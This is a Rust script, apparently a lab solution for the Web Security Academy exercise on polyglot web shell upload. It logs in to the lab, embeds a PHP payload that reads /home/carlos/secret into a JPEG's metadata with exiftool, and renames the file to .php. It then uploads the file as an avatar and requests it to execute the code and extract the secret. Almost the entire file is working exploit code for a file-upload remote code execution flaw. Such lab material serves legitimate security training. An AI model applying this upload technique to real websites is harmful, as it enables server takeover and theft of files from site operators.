/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 13/10/2023
*
* Lab: Remote code execution via polyglot web shell upload
*
* Steps: 1. Fetch login page
*        2. Extract csrf token and session cookie
*        3. Login as wiener
*        4. Fetch wiener profile
*        5. Embed the payload in the image using exiftool
*        6. Change the extension of the image to .php
*        7. Read the image with embedded payload
*        8. Upload the image with the embedded payload
*        9. Fetch the uploaded image with the embedded payload to read the secret
*        10. Submit the solution
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{
        multipart::{Form, Part},
        Client, ClientBuilder, Response,
    },
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    fs,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aff00f004454b9b82043a1b00700037.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let mut csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    // extract session cookie of wiener
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Fetching wiener profile.. ".white(),);
    io::stdout().flush();

    // fetch wiener profile
    let wiener = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch wiener profile".red()));

    // extract csrf token
    csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    // image name
    // make sure that there is an image with this name in the root directory
    let image_name = "white.jpg";

    // the final image name with the embedded payload
    // you can change this to what you want
    let image_with_payload_name = "hack.php";

    // payload to embed in the image
    let payload = r###"<br><h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>"###;

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗5⦘ Embedding the payload in the image using exiftool.. ".white(),
    );
    io::stdout().flush();

    // embed the payload in the image using exiftool
    // we want to run this command:
    // ~$ exiftool -DocumentName="<br> <h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>" ./white.jpg
    process::Command::new("exiftool")
        .args([format!("-DocumentName={payload}"), image_name.to_string()])
        .output()
        .expect(&format!(
            "{}",
            "[!] Failed to embed the payload using exiftool".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗6⦘ Changing the extension of the image to .php.. ".white(),
    );
    io::stdout().flush();

    // change the extension of the image to .php
    // if you are still a windows user, changing 'mv' to 'move' should make the script still work
    process::Command::new("mv")
        .args([image_name, image_with_payload_name])
        .output()
        .expect(&format!(
            "{}",
            "[!] Failed to change the extension of the image".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗7⦘ Reading the image with embedded payload.. ".white(),
    );
    io::stdout().flush();

    // read the image with the embedded paylaod
    let image_with_payload = fs::read(image_with_payload_name).expect(&format!(
        "{}",
        "[!] Failed to read the image with the embedded payload".red()
    ));

    // the avatar part of the request
    let avatar_part = Part::bytes(image_with_payload)
        .file_name(image_with_payload_name)
        .mime_str("application/x-php")
        .expect(&format!(
            "{}",
            "[!] Failed to construct the avatar part of the request".red()
        ));

    // construct the multipart form of the request
    let form = Form::new()
        .part("avatar", avatar_part)
        .text("user", "wiener")
        .text("csrf", csrf);

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗8⦘ Uploading the image with the embedded payload.. ".white(),
    );
    io::stdout().flush();

    // upload the image with the embedded payload
    client
        .post(format!("{url}/my-account/avatar"))
        .header("Cookie", format!("session={session}"))
        .multipart(form)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to upload the image with the embedded payload".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗9⦘ Fetching the uploaded image with the embedded payload to read the secret.. ".white(),
    );
    io::stdout().flush();

    // fetch the uploaded image
    let uploaded_image = client
        .get(format!("{url}/files/avatars/{image_with_payload_name}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the uploaded image with the embedded payload".red()
        ));

    // get the body of the response
    let body = uploaded_image.text().unwrap();

    // extract the carlos secret
    let secret = capture_pattern("Secret: (.*)", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the carlos secret".red()
    ));

    println!("{}", "OK".green());
    println!("❯ {} {}", "Secret:".blue(), secret.yellow());
    print!("{} ", "⦗10⦘ Submitting solution..".white());
    io::stdout().flush();

    // submit the solution
    client
        .post(format!("{url}/submitSolution"))
        .form(&HashMap::from([("answer", secret)]))
        .send()
        .expect(&format!("{}", "[!] Failed to submit the solution".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    );
    print!(
        "{} ",
        "❯ Changing the image extension back to its original one..".white()
    );
    io::stdout().flush();

    // change the image extension back to its original one
    // if you are still a windows user, changing 'mv' to 'move' should make the script still work
    process::Command::new("mv")
        .args([image_with_payload_name, image_name])
        .output()
        .expect(&format!(
            "{}",
            "[!] Failed to changing the image extension back to its original one".red()
        ));

    println!("{}", "OK".green());
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
